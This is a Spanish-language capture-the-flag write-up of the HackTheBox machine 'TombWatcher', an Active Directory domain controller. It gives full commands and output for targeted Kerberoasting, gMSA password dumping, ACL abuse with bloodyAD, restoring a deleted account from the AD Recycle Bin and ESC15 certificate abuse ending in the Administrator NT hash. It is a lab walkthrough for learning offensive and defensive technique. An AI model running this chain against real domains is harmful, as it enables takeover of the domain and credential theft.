---
title: "TombWatcher (Medium)"
date: 2026-11-07
author: "Isma"
slug: "tombwatcher"
tags: ["Windows", "AD", "Targeted Kerberoasting", "ACL Abuse", "BloodHound", "gMSA", "AD Recycle Bin", "ADCS", "ESC15", "CVE"]
categories: ["Machine", "CPTS Preparation"]
draft: false
source: "obsidian"
---

## Resumen

TombWatcher es un controlador de dominio Windows pensado como una auditoría de ACLs de principio a fin, con credenciales de salida (`henry`). Desde ahí es un encadenado continuo de permisos mal configurados: **WriteSPN** sobre `alfred` para forzar un **Kerberoasting dirigido**, **AddSelf** a un grupo que da **ReadGMSAPassword** sobre una cuenta gMSA, y desde ella **ForceChangePassword** / **WriteOwner** / **GenericAll** hasta llegar a `john`. `john` tiene `GenericAll` sobre la OU de ADCS, pero el permiso interesante está asignado a una cuenta **ya borrada**: la restauro desde la **Papelera de Reciclaje de AD** para heredar sus privilegios sobre la plantilla de certificados `WebServer`, vulnerable a **ESC15 (CVE-2024-49019)**. Con eso pido un certificado de *Certificate Request Agent* y lo uso para solicitar, en nombre de `Administrator`, un certificado del template `User`, que me da el hash NT del administrador del dominio.

## Reconocimiento

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http
636/tcp   open  ssl|ldap
3268/tcp  open  ldap
3269/tcp  open  ssl|ldap
5985/tcp  open  http          (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
```

Es un controlador de dominio de `tombwatcher.htb`. Como en varias máquinas de este estilo, HTB da un usuario válido de entrada:

```
henry : H3nry_987TGV!
```

### Enumeración con RustHound

Con esas credenciales recojo datos de BloodHound usando **RustHound**:

![tombwatcher](/images/obsidian/tombwatcher/pasted-image-20260817112143.png)

![tombwatcher](/images/obsidian/tombwatcher/pasted-image-20260817112125.png)

![tombwatcher](/images/obsidian/tombwatcher/pasted-image-20260817112359.png)

El grafo muestra que **`henry` tiene `WriteSPN` sobre `alfred`**:

![tombwatcher](/images/obsidian/tombwatcher/pasted-image-20260817113743.png)

## Acceso Inicial (Foothold)

### Kerberoasting dirigido (targeted) sobre Alfred

`alfred` no tiene SPN propio, así que un Kerberoasting normal no lo afecta. Pero con `WriteSPN` puedo **asignarle temporalmente un SPN yo mismo**, pedir el ticket de servicio (que viene cifrado con el hash de su contraseña) y luego quitar el SPN para no dejar rastro. Primero descarto AS-REP Roasting:

```bash
impacket-GetNPUsers tombwatcher.htb/ -dc-ip 10.129.232.167 -no-pass -usersfile valid_users.txt
```

```
[-] User alfred doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Ninguna cuenta es vulnerable. Uso **targetedKerberoast** (automatiza añadir SPN → pedir TGS → quitar SPN) con las credenciales de `henry`:

```bash
faketime -f +4h python targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
```

```
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$...
[VERBOSE] SPN removed successfully for (Alfred)
```

Crackeo el TGS:

![tombwatcher](/images/obsidian/tombwatcher/pasted-image-20260817120554.png)

```
alfred : basketball
```

## Movimiento Lateral

### AddSelf → grupo Infrastructure → ReadGMSAPassword

BloodHound muestra que `alfred` tiene **`AddSelf`** sobre el grupo **`Infrastructure`**: puede añadirse a sí mismo sin que nadie más lo autorice.

![tombwatcher](/images/obsidian/tombwatcher/pasted-image-20260817120719.png)

```bash
bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u alfred -p basketball add groupMember INFRASTRUCTURE alfred
```

![tombwatcher](/images/obsidian/tombwatcher/pasted-image-20260817121301.png)

```bash
net rpc group members "infrastructure" -U "tombwatcher.htb"/"alfred"%"basketball" -S "DC01.tombwatcher.htb"
```

```
TOMBWATCHER\Alfred
```

El grupo `Infrastructure` tiene **`ReadGMSAPassword`** sobre la cuenta de servicio gestionada (**gMSA**) `ansible_dev$`:

![tombwatcher](/images/obsidian/tombwatcher/pasted-image-20260817120831.png)

Las gMSA tienen su contraseña gestionada automáticamente por AD y legible solo por los principales autorizados. Como ahora formo parte de uno de ellos, la extraigo con **gMSADumper**:

```bash
python gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'
```

```
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::cb3161cb2c9d84b58ba3014f55040d75
```

### ForceChangePassword → WriteOwner → GenericAll hasta John

`ansible_dev$` tiene **`ForceChangePassword`** sobre `sam`:

```bash
bloodyAD -d tombwatcher.htb -u 'ansible_dev$' -p :cb3161cb2c9d84b58ba3014f55040d75 --host DC01.tombwatcher.htb set password 'sam' 'Password123!'
```

A su vez, `sam` tiene **`WriteOwner`** sobre `john`:

![tombwatcher](/images/obsidian/tombwatcher/pasted-image-20260817122315.png)

`WriteOwner` por sí solo no deja modificar la DACL de un objeto directamente, pero sí permite **convertirme en su propietario**, y el propietario de un objeto siempre puede reescribir sus permisos:

```bash
bloodyAD -d tombwatcher.htb -u sam -p 'Password123!' --host DC01.tombwatcher.htb set owner 'john' 'sam'
```

```
[+] Old owner S-1-5-21-...-512 is now replaced by sam on john
```

Ya como propietario, me concedo `GenericAll` sobre `john`:

```bash
bloodyAD -d tombwatcher.htb -u sam -p 'Password123!' --host DC01.tombwatcher.htb add genericAll 'john' 'sam'
```

Y con control total le cambio la contraseña:

```bash
bloodyAD -d tombwatcher.htb -u sam -p 'Password123!' --host DC01.tombwatcher.htb set password 'john' 'Password123!'
```

`john` pertenece al grupo **Remote Management Users**, así que entro directamente por WinRM y leo la **User Flag**:

![tombwatcher](/images/obsidian/tombwatcher/pasted-image-20260817122829.png)

![tombwatcher](/images/obsidian/tombwatcher/pasted-image-20260817123041.png)

## Escalada de Privilegios

### GenericAll sobre la OU ADCS... pero asignado a un usuario borrado

`john` tiene `GenericAll` sobre la unidad organizativa **ADCS**. Enumero las plantillas de certificados con Certipy:

```bash
certipy-ad find -u john@tombwatcher.htb -p 'Password123!' -dc-ip 10.129.232.167
```

Todo parece normal salvo la plantilla **`WebServer`**, cuyos permisos de inscripción incluyen un **SID en crudo** en vez de un nombre resuelto:

```
Enrollment Rights : TOMBWATCHER.HTB\Domain Admins
                     TOMBWATCHER.HTB\Enterprise Admins
                     S-1-5-21-1392491010-1358638721-2126982587-1111
```

Que Certipy no pueda resolver ese SID a un nombre normalmente significa que la cuenta propietaria **ya no existe**.

### Restaurar la cuenta desde la Papelera de Reciclaje de AD

La **Papelera de Reciclaje de Active Directory** conserva los objetos eliminados en un estado recuperable durante el periodo de *tombstone*. Los busco:

```powershell
Import-Module ActiveDirectory
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties cn,objectSid,isDeleted
```

```
CN        : cert_admin DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
isDeleted : True
objectSid : S-1-5-21-1392491010-1358638721-2126982587-1111
```

El SID coincide exactamente con el que aparecía sin resolver en la plantilla `WebServer`. Restauro ese objeto concreto:

```powershell
Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
```

> **Por qué esto funciona**
> Cuando se restaura un objeto de la papelera, AD lee su metadato `lastKnownParent` e intenta recrearlo **en su contenedor original**. El `lastKnownParent` de `cert_admin` es la OU **ADCS**, sobre la que `john` tiene `GenericAll`. Al reinsertarse ahí, `cert_admin` hereda de nuevo los permisos de esa OU.

Para asegurar que la herencia se propaga correctamente al objeto recién recreado, reescribo explícitamente la ACL con flags de propagación:

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' TOMBWATCHER.HTB/john:'Password123!'
```

Y le pongo una contraseña nueva a la cuenta restaurada:

```powershell
Set-ADAccountPassword -Identity "cert_admin" -Reset -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

### ESC15 (CVE-2024-49019)

Vuelvo a enumerar con `cert_admin` y Certipy confirma la vulnerabilidad:

```bash
certipy-ad find -u cert_admin@tombwatcher.htb -p 'Password123!' -dc-ip 10.129.232.167 -vulnerable -stdout
```

```
Template Name : WebServer
Enrollee Supplies Subject : True
Schema Version : 1
[!] Vulnerabilities
  ESC15 : Enrollee supplies subject and schema version is 1.
```

**ESC15** se da en plantillas v1 donde el solicitante puede especificar **políticas de aplicación arbitrarias** en la petición de certificado, incluida la de *Certificate Request Agent* (normalmente reservada a los agentes de inscripción en nombre de terceros). Solicito un certificado de ese tipo contra `WebServer`:

```bash
certipy req -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -dc-ip '10.129.232.167' \
    -target 'DC01.TOMBWATCHER.HTB' -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

Con ese certificado de "agente de inscripción", pido un segundo certificado **en nombre de Administrator**, esta vez contra la plantilla `User` (el template estándar de Microsoft):

```bash
certipy req -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -dc-ip '10.129.232.167' \
    -target 'DC01.TOMBWATCHER.HTB' -ca 'tombwatcher-CA-1' -template 'User' \
    -pfx 'cert_admin.pfx' -on-behalf-of 'tombwatcher\Administrator'
```

> **Por qué el template importa**
> `WebServer` tiene `Enrollee Supplies Subject: True`: el solicitante debe indicar el UPN manualmente. `User` lo tiene en `False`, que es justo lo que hace falta para `-on-behalf-of`: al pedir el certificado "de parte de" `Administrator`, la CA rellena automáticamente el UPN y el SID **desde la cuenta real de AD** de esa persona.

- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

### Autenticación con el certificado

```bash
faketime -f +4h certipy-ad auth -dc-ip 10.129.232.167 -pfx administrator.pfx
```

```
[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

Con el hash NT de `Administrator` entro al DC y capturo la **Root Flag**.

![tombwatcher](/images/obsidian/tombwatcher/virtualboxvm_yxxxcljo49.png)

## Conclusiones

- Las ACLs mal configuradas se encadenan: cada `WriteSPN`, `AddSelf`, `ForceChangePassword` o `WriteOwner` por separado parece inofensivo, pero juntos forman un camino directo a Domain Admin. BloodHound es la herramienta que hace visible ese camino.
- Un SID sin resolver en una lista de permisos no es ruido: es la señal de que la cuenta propietaria del permiso fue borrada, y la Papelera de Reciclaje de AD puede devolverle la vida (y sus privilegios) a quien la restaure.
- Las plantillas de certificados en **Schema v1** que permiten políticas de aplicación arbitrarias (ESC15 / CVE-2024-49019) deben tratarse igual que ESC1: cualquiera con permiso de inscripción puede escalar a Domain Admin.
